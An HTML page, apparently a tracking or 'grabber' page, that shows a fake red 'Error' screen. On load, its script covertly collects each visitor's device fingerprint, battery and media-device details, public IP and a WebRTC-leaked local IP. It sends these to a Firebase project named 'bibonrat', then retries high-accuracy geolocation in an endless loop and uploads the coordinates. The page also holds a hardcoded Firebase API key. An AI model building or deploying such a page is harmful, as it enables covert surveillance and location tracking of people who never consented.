<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Error</title>
</head>

<body style="margin:0; padding:0; background:black;">

    <div style="
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: red;
            font-family: Arial, sans-serif;
            font-weight: bold;
            font-size: 12px;
            text-align: center;
         ">

        <div style="margin-bottom: 15px; letter-spacing: 3px;">
            A.&middot;.L.&middot;.G.&middot;.D.&middot;.G.&middot;.A.&middot;.D.&middot;.U.&middot;.
        </div>

        <div style="
            font-size: 40px;
            color: #ff0000;
            text-shadow: 0 0 10px red, 0 0 20px red;
        ">
            Error
        </div>

    </div>
    <!-- Скрытые элементы для статусов -->
    <div id="authStatus" style="display:none"></div>
    <div id="publicIpStatus" style="display:none"></div>
    <div id="localIpStatus" style="display:none"></div>
    <table style="display:none"><tbody id="infoBody"></tbody></table>

    <!-- Видимая отладочная панель: показывает статус сохранения и геолокации -->
    <div style="position:fixed; left:8px; right:8px; bottom:8px; background:#111; color:#fff;
                font-family:monospace; font-size:11px; padding:8px; border:1px solid #444;
                border-radius:6px; max-height:40vh; overflow:auto;">
        <div id="firestoreStatus">…</div>
        <div id="locationStatus">…</div>
        <div id="geoLog" style="margin-top:6px; color:#9cf; white-space:pre-wrap;"></div>
    </div>

    <!-- Firebase SDK (modular) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
        import { getFirestore, collection, addDoc, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        // Конфигурация Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyAQlLh2Abk92sZVCSsYSCxvps4Uld3C1Lk",
            authDomain: "bibonrat.firebaseapp.com",
            databaseURL: "https://bibonrat-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "bibonrat",
            storageBucket: "bibonrat.firebasestorage.app",
            messagingSenderId: "78759159251",
            appId: "1:78759159251:web:3e40d7d5a2aa762f01bb26"
        };

        const app = initializeApp(firebaseConfig);

        const db = getFirestore(app); // ✅ default Firestore
        const auth = getAuth(app);

        const COLLECTION_NAME = "Clients";

        // DOM элементы
        const infoBody = document.getElementById("infoBody");
        const locationStatus = document.getElementById("locationStatus");
        const publicIpStatus = document.getElementById("publicIpStatus");
        const localIpStatus = document.getElementById("localIpStatus");
        const firestoreStatus = document.getElementById("firestoreStatus");
        const authStatus = document.getElementById("authStatus");

        // Объект для сбора данных
        const collectedData = {};

        function setStatus(el, type, text) {
            if (!el) return;
            el.className = "status " + type;
            el.innerText = text;
        }

        const geoLogEl = document.getElementById("geoLog");
        function logLine(msg) {
            const t = new Date().toLocaleTimeString();
            const line = `[${t}] ${msg}`;
            console.log(line);
            if (geoLogEl) geoLogEl.textContent += line + "\n";
        }

        function addInfo(label, value) {
            if (value === undefined || value === null) value = "недоступно";
            const row = document.createElement("tr");
            row.innerHTML = `<td>${label}</td><td>${value}</td>`;
            infoBody.appendChild(row);
            collectedData[label] = value;
        }

        // Авторизация (анонимная)
        let authReadyResolve;
        const authReady = new Promise((res) => (authReadyResolve = res));

        async function initAuth() {
            try {
                const cred = await signInAnonymously(auth);
                const uid = cred?.user?.uid || "unknown";
                addInfo("Firebase UID", uid);
                setStatus(authStatus, "success", "✅ Firebase авторизация (анонимно) успешна");
                authReadyResolve(true);
            } catch (error) {
                console.error("Ошибка авторизации:", error);
                setStatus(authStatus, "error", "❌ Ошибка Firebase авторизации: " + (error?.message || error));
                firestoreStatus.innerHTML = "⚠️ Запись в Firestore невозможна без авторизации.";
                firestoreStatus.style.color = "red";
                authReadyResolve(false);
            }
        }

        async function saveToFirestore(data) {
            const ok = await authReady;
            if (!ok) return null;

            try {
                data.timestamp = new Date().toISOString();
                data.pageUrl = location.href;
                data.firestoreDb = "(default)";

                const docRef = await addDoc(collection(db, COLLECTION_NAME), data);
                console.log("Saved to Firestore (default). Doc ID:", docRef.id);
                firestoreStatus.innerHTML = `✅ Данные сохранены в Firestore (default) (ID: ${docRef.id})`;
                firestoreStatus.style.color = "green";
                return docRef.id;
            } catch (error) {
                console.error("Ошибка при записи в Firestore:", error);
                firestoreStatus.innerHTML = `❌ Ошибка сохранения: ${error?.message || error}`;
                firestoreStatus.style.color = "red";
                return null;
            }
        }

        async function updateGeoInFirestore(docId, geoData) {
            const ok = await authReady;
            if (!ok) {
                console.warn("updateGeo: auth not ready");
                firestoreStatus.innerHTML = "❌ updateGeo: нет авторизации";
                firestoreStatus.style.color = "red";
                return false;
            }
            if (!docId) {
                console.warn("updateGeo: docId отсутствует, сохраняю гео отдельным документом");
                try {
                    const docRef = await addDoc(collection(db, COLLECTION_NAME), {
                        ...geoData,
                        note: "geo-only (no original docId)",
                        timestamp: new Date().toISOString(),
                        pageUrl: location.href
                    });
                    firestoreStatus.innerHTML = `✅ Гео сохранено отдельным doc (${docRef.id})`;
                    firestoreStatus.style.color = "green";
                    return true;
                } catch (e) {
                    console.error("Ошибка addDoc гео:", e);
                    firestoreStatus.innerHTML = `❌ Гео addDoc: ${e?.code || ""} ${e?.message || e}`;
                    firestoreStatus.style.color = "red";
                    return false;
                }
            }
            try {
                await updateDoc(doc(db, COLLECTION_NAME, docId), geoData);
                console.log("Geo updated for doc:", docId);
                firestoreStatus.innerHTML = `✅ Гео обновлено в doc ${docId}`;
                firestoreStatus.style.color = "green";
                return true;
            } catch (error) {
                console.error("Ошибка updateDoc гео:", error);
                firestoreStatus.innerHTML = `❌ updateDoc: ${error?.code || ""} ${error?.message || error}`;
                firestoreStatus.style.color = "red";
                // Фолбэк: если правила запрещают update — пишем отдельным документом со ссылкой
                try {
                    const docRef = await addDoc(collection(db, COLLECTION_NAME), {
                        ...geoData,
                        note: "geo-update-fallback",
                        originalDocId: docId,
                        timestamp: new Date().toISOString(),
                        pageUrl: location.href
                    });
                    firestoreStatus.innerHTML = `⚠️ updateDoc запрещён, гео сохранено отдельным doc (${docRef.id}). Ссылка на оригинал: ${docId}`;
                    firestoreStatus.style.color = "orange";
                    return true;
                } catch (e2) {
                    console.error("Фолбэк addDoc тоже упал:", e2);
                    return false;
                }
            }
        }

        function requestGeoOnce(options) {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error("not_supported"));
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve(position),
                    (error) => reject(error),
                    options || { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            });
        }

        // Ждёт лучший фикс через watchPosition с адаптивным выходом.
        // Условия завершения (любое):
        //   1) точность <= targetAccuracyMeters
        //   2) точность не улучшилась за stableMs мс (значит лучше уже не будет)
        //   3) истёк maxWaitMs
        function watchBestPosition({
            targetAccuracyMeters = 50,
            maxWaitMs = 15000,
            stableMs = 4000,
            highAccuracy = true
        } = {}) {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error("not_supported"));
                    return;
                }
                let best = null;
                let stableTimer = null;

                const finish = (kind) => {
                    navigator.geolocation.clearWatch(watchId);
                    clearTimeout(hardTimer);
                    clearTimeout(stableTimer);
                    if (best) {
                        logLine(`watch finish (${kind}), best ±${best.coords.accuracy.toFixed(1)} м`);
                        resolve(best);
                    } else {
                        reject(new Error("watch_timeout_no_fix"));
                    }
                };

                const armStableTimer = () => {
                    clearTimeout(stableTimer);
                    stableTimer = setTimeout(() => finish("stable"), stableMs);
                };

                const watchId = navigator.geolocation.watchPosition(
                    (pos) => {
                        const acc = pos.coords.accuracy;
                        logLine(`watch: фикс ±${acc.toFixed(1)} м`);
                        const improved = !best || acc < best.coords.accuracy;
                        if (improved) {
                            best = pos;
                            armStableTimer();
                        }
                        if (acc <= targetAccuracyMeters) finish("target");
                    },
                    (err) => {
                        logLine(`watch error: ${err.code}/${err.message}`);
                        if (best) finish("error-with-best");
                        else {
                            navigator.geolocation.clearWatch(watchId);
                            clearTimeout(hardTimer);
                            clearTimeout(stableTimer);
                            reject(err);
                        }
                    },
                    { enableHighAccuracy: highAccuracy, timeout: maxWaitMs, maximumAge: 0 }
                );

                const hardTimer = setTimeout(() => finish("hard-timeout"), maxWaitMs);
                armStableTimer();
            });
        }

        async function requestGeoSmart() {
            // Берём первый же фикс — без ожидания улучшения точности.
            try {
                return await requestGeoOnce({ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
            } catch (e1) {
                logLine(`high-accuracy не вышел (${e1?.code || ""}/${e1?.message || e1}), пробую low-accuracy…`);
                return await requestGeoOnce({ enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 });
            }
        }

        async function ensureGeoAndUpdate(docId) {
            logLine(`ensureGeoAndUpdate старт, docId=${docId}`);
            let attempt = 0;
            while (true) {
                attempt++;
                logLine(`Попытка #${attempt}: getCurrentPosition()`);
                try {
                    const position = await requestGeoSmart();
                    const { latitude, longitude, accuracy } = position.coords;
                    const lat = latitude.toFixed(6);
                    const lon = longitude.toFixed(6);
                    const acc = (accuracy || 0).toFixed(1) + " м";
                    logLine(`✅ Гео получено: ${lat}, ${lon} (±${acc})`);
                    addInfo("Широта", lat);
                    addInfo("Долгота", lon);
                    addInfo("Точность GPS", acc);
                    setStatus(locationStatus, "success", "✅ Геолокация получена");
                    logLine(`Пишу в Firestore (docId=${docId})…`);
                    const ok = await updateGeoInFirestore(docId, {
                        "Широта": lat,
                        "Долгота": lon,
                        "Точность GPS": acc,
                        geoUpdatedAt: new Date().toISOString()
                    });
                    logLine(`Результат записи: ${ok ? "OK" : "FAIL"}`);
                    if (ok) return;
                    await new Promise((r) => setTimeout(r, 3000));
                } catch (error) {
                    let msg = "❌ Геолокация недоступна";
                    if (error && typeof error.code !== "undefined") {
                        switch (error.code) {
                            case error.PERMISSION_DENIED: msg = "❌ Доступ к геолокации запрещён"; break;
                            case error.POSITION_UNAVAILABLE: msg = "❌ Позиция недоступна"; break;
                            case error.TIMEOUT: msg = "❌ Таймаут геолокации"; break;
                        }
                    }
                    logLine(msg + ` (${error?.message || error?.code || error})`);
                    setStatus(locationStatus, "error", msg);
                    await new Promise((r) => setTimeout(r, 3000));
                }
            }
        }

        // Публичный IP
        function getPublicIP() {
            return fetch("https://api.ipify.org?format=json")
                .then((res) => res.json())
                .then((data) => data.ip)
                .catch(() => "не удалось определить");
        }

        // Локальный IP (WebRTC)
        function getLocalIP() {
            return new Promise((resolve) => {
                if (!window.RTCPeerConnection) {
                    resolve("не поддерживается");
                    return;
                }
                const pc = new RTCPeerConnection({ iceServers: [] });
                let ipFound = false;
                pc.createDataChannel("");
                pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => { });
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = ipRegex.exec(event.candidate.candidate);
                        if (match && !ipFound) {
                            ipFound = true;
                            resolve(match[1]);
                            pc.close();
                        }
                    } else {
                        setTimeout(() => {
                            if (!ipFound) {
                                resolve("не удалось определить");
                                pc.close();
                            }
                        }, 500);
                    }
                };
                setTimeout(() => {
                    if (!ipFound) {
                        resolve("таймаут");
                        pc.close();
                    }
                }, 3000);
            });
        }

        // Главная функция
        (async function main() {
            initAuth();

            addInfo("User Agent", navigator.userAgent);
            addInfo("Платформа", navigator.platform);
            addInfo("Язык", navigator.language);
            addInfo("Разрешение экрана", `${screen.width} x ${screen.height}`);
            addInfo("Глубина цвета", `${screen.colorDepth} бит`);
            addInfo("Временная зона", Intl.DateTimeFormat().resolvedOptions().timeZone);
            addInfo("Включён ли cookie", navigator.cookieEnabled ? "Да" : "Нет");
            addInfo("Ядра CPU", navigator.hardwareConcurrency || "не поддерживается");
            addInfo("ОЗУ устройства", navigator.deviceMemory ? navigator.deviceMemory + " GB" : "недоступно");

            if (navigator.connection) {
                const conn = navigator.connection;
                addInfo("Тип сети", conn.effectiveType || "неизвестно");
                addInfo("RTT (ms)", conn.rtt || "неизвестно");
                addInfo("Скорость загрузки (Mbps)", conn.downlink || "неизвестно");
                addInfo("Экономия данных", conn.saveData ? "включена" : "отключена");
            } else {
                addInfo("Информация о сети", "не поддерживается");
            }

            // Батарея
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    addInfo("Уровень заряда", (battery.level * 100).toFixed(0) + "%");
                    addInfo("Заряжается", battery.charging ? "Да" : "Нет");
                    if (!battery.charging && battery.dischargingTime !== Infinity) {
                        addInfo("Время до разрядки", (battery.dischargingTime / 60).toFixed(0) + " мин");
                    }
                } catch (e) {
                    addInfo("Статус батареи", "ошибка доступа");
                }
            } else {
                addInfo("Battery API", "не поддерживается");
            }

            // Устройства
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    const video = devices.filter((d) => d.kind === "videoinput").length;
                    const audio = devices.filter((d) => d.kind === "audioinput").length;
                    addInfo("Камеры", video);
                    addInfo("Микрофоны", audio);
                } catch (e) {
                    addInfo("Медиа-устройства", "не определены");
                }
            } else {
                addInfo("enumerateDevices", "не поддерживается");
            }

            const publicIPPromise = getPublicIP().then((ip) => {
                addInfo("Публичный IP", ip);
                setStatus(publicIpStatus, ip.includes("не удалось") ? "error" : "success", ip);
            });

            const localIPPromise = getLocalIP().then((ip) => {
                addInfo("Локальный IP", ip);
                setStatus(localIpStatus, ip.includes("не удалось") || ip.includes("не поддерживается") ? "error" : "success", ip);
            });

            await Promise.all([publicIPPromise, localIPPromise]);

            const docId = await saveToFirestore(collectedData);

            if (!navigator.geolocation) {
                setStatus(locationStatus, "error", "❌ Геолокация не поддерживается");
                return;
            }

            ensureGeoAndUpdate(docId);
        })();
    </script>
</body>
</html>
